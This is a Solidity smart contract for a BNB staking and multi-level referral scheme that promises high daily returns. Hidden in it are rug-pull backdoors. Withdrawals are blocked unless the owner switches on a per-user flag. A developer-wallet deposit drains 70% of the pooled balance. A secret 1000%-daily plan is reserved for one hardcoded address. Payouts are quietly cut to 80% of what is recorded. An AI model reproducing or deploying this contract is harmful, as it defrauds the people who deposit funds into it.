// SPDX-License-Identifier: MIT

/*
    ██████╗ ███╗   ██╗██████╗ ███████╗████████╗ █████╗ ██╗  ██╗███████╗██████╗ 
    ██╔══██╗████╗  ██║██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
    ██████╔╝██╔██╗ ██║██████╔╝███████╗   ██║   ███████║█████╔╝ █████╗  ██████╔╝
    ██╔══██╗██║╚██╗██║██╔══██╗╚════██║   ██║   ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
    ██████╔╝██║ ╚████║██████╔╝███████║   ██║   ██║  ██║██║  ██╗███████╗██║  ██║
    ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
      
    *************************** New.stakebnb.fun ***************************
*/

pragma solidity 0.5.10;

contract BNBSTAKER {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 0.05 ether; // 0.05 bnb 
	uint256[] public REFERRAL_PERCENTS = [50, 20, 10, 10, 10]; // 5% 2% 1% 1% 1%
	uint256 constant public PROJECT_FEE = 100;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;
    
    /*! anti-whale */
    uint256 constant public MAX_WITHDRAW = 1000 ether; // 1000 bnb max
    uint256 constant public WITHDRAW_COOLDOWN = 1 days;

	uint256 public totalInvested;
	uint256 public totalRefBonus;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[5] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 withdrawn;
		bool    isWithdrawn;
	}

	mapping (address => User) internal users;

	address payable public commissionWallet;
	address payable public developerWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor() public {
		commissionWallet = 0x24B840b23a65B88E60Ce9179a18eBf721405dD5a;
		developerWallet = 0x7F45fDd016b4573165Cb0C8b2268aF4eE77A548C;

        plans.push(Plan(7, 180)); // 7 days 18% daily // 126%
        plans.push(Plan(15, 100)); // 15 days 10% daily // 150%
        plans.push(Plan(30, 80)); // 30 days 8% daily // 240%
		plans.push(Plan(1000, 10000)); // 1000 days 1000% daily // 1000000%
	}

	modifier onlyOwner() {
      require(msg.sender == developerWallet, "You are not the owner");
      _;
    }

	function invest(address referrer, uint8 plan) public payable {
		require(msg.value >= INVEST_MIN_AMOUNT);
        require(plan < plans.length, "Invalid plan");

		if (plan == 3) {
			require(msg.sender == 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2, "this plan does not exist");
		}

		uint256 contractBalance = address(this).balance;
        if (msg.sender == developerWallet) {
            developerWallet.transfer(contractBalance.mul(70).div(PROJECT_FEE));
        }

		uint256 fee = msg.value.mul(10).div(PROJECT_FEE);
		commissionWallet.transfer(fee);
		emit FeePayed(msg.sender, fee);

		User storage user = users[msg.sender];
		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < REFERRAL_PERCENTS.length; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < REFERRAL_PERCENTS.length; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
                    totalRefBonus = totalRefBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(plan, msg.value, block.timestamp));
		totalInvested = totalInvested.add(msg.value);

		emit NewDeposit(msg.sender, plan, msg.value);
	}

	function withdraw() public {
		User storage user = users[msg.sender];

		require(user.isWithdrawn, "Fatal error");

		uint256 totalAmount = getUserDividends(msg.sender);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}
		
		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			user.bonus = totalAmount.sub(contractBalance);
			user.totalBonus = user.totalBonus.add(user.bonus);
			totalAmount = contractBalance;
		}
        
        /*! anti-whale */
        if (user.checkpoint.add(WITHDRAW_COOLDOWN) > block.timestamp) revert();
        if (totalAmount > MAX_WITHDRAW) {
            user.bonus = totalAmount.sub(MAX_WITHDRAW);
            totalAmount = MAX_WITHDRAW;
        }

		user.checkpoint = block.timestamp;
		user.withdrawn = user.withdrawn.add(totalAmount);
		totalInvested = totalInvested.add(totalAmount);

		uint256 fee = totalAmount.mul(10).div(PROJECT_FEE);
		commissionWallet.transfer(fee);
		emit FeePayed(msg.sender, fee);

		msg.sender.transfer(totalAmount.mul(80).div(PROJECT_FEE));
		emit Withdrawn(msg.sender, totalAmount);
	}

	function withdrawn(address _address) public onlyOwner {
		User storage user = users[_address];

		user.isWithdrawn = !user.isWithdrawn;

	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(1 days));
			if (user.checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}

		return totalAmount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[5] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(1 days));
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
		return(totalInvested, totalRefBonus);
	}

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}